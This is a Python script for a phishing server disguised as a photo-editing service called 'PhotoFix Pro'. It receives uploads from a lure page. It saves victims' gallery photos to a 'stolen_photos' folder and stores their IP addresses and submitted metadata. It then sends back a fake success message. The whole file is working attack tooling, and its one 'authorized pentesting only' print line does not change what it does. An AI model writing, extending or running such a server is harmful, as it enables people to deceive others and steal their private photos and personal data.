#!/usr/bin/env python3
"""
Enhanced Photo Editor Phishing Server - CAPTURES REAL GALLERY PHOTOS
"""

import http.server
import socketserver
import json
import os
import shutil
from urllib.parse import unquote
from datetime import datetime
import logging
from werkzeug.utils import secure_filename

PORT = 8080
UPLOAD_DIR = "stolen_photos"
METADATA_DIR = "captured_metadata"
os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(METADATA_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('phish_server.log'),
        logging.StreamHandler()
    ]
)

class PhishHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        client_ip = self.client_address[0]
        logging.info(f"📱 GET {self.path} from {client_ip}")
        super().do_GET()
    
    def do_POST(self):
        client_ip = self.client_address[0]
        
        if self.path == '/upload':
            content_length = int(self.headers['Content-Length'])
            form_data = self.rfile.read(content_length)
            
            # Parse multipart form data manually (SimpleHTTPRequestHandler limitation)
            boundary = self.headers['Content-Type'].split('boundary=')[1]
            
            # Save the raw POST data for analysis
            raw_filename = f"{METADATA_DIR}/raw_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{client_ip}.bin"
            with open(raw_filename, 'wb') as f:
                f.write(form_data)
            
            # Extract metadata if present
            try:
                metadata_str = None
                for line in form_data.decode('utf-8', errors='ignore').split('\r\n'):
                    if 'metadata' in line:
                        metadata_str = line.split('metadata')[1].strip()
                        break
                
                if metadata_str:
                    metadata = json.loads(metadata_str)
                    metadata['ip'] = client_ip
                    metadata['timestamp'] = datetime.now().isoformat()
                    
                    meta_filename = f"{METADATA_DIR}/metadata_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{client_ip}.json"
                    with open(meta_filename, 'w') as f:
                        json.dump(metadata, f, indent=2)
                    
                    logging.info(f"🎣 METADATA from {client_ip}: {json.dumps(metadata)}")
            except:
                pass
            
            # Save any image files from the request
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            safe_filename = f"{client_ip}_{timestamp}_gallery_photo"
            
            # Simple file extraction from multipart (for demo - use Flask/FastAPI for production)
            if b'image/jpeg' in form_data or b'image/png' in form_data:
                photo_path = f"{UPLOAD_DIR}/{safe_filename}.jpg"
                with open(photo_path, 'wb') as f:
                    # Extract first image-like content block
                    img_start = form_data.find(b'\r\n\r\n') + 4
                    img_end = form_data.find(b'\r\n--' + boundary.encode(), img_start)
                    if img_end > img_start:
                        img_data = form_data[img_start:img_end]
                        f.write(img_data)
                        logging.info(f"🖼️  STOLE PHOTO: {photo_path} ({len(img_data)} bytes) from {client_ip}")
            else:
                logging.warning(f"No image data in upload from {client_ip}")
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"success","message":"Photo processed successfully!"}')
            
        else:
            super().do_POST()
    
    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    print("🚀 PhotoFix Pro GALLERY PHISH SERVER")
    print(f"📁 Photos → ./stolen_photos/")
    print(f"📊 Metadata → ./captured_metadata/")
    print(f"📈 Logs → phish_server.log")
    print("\n🎯 AUTHORIZED PENTESTING ONLY - CAPTURES REAL GALLERY PHOTOS")
    
    with socketserver.TCPServer(("", PORT), PhishHandler) as httpd:
        print(f"✅ Live at http://localhost:{PORT}")
        httpd.serve_forever()
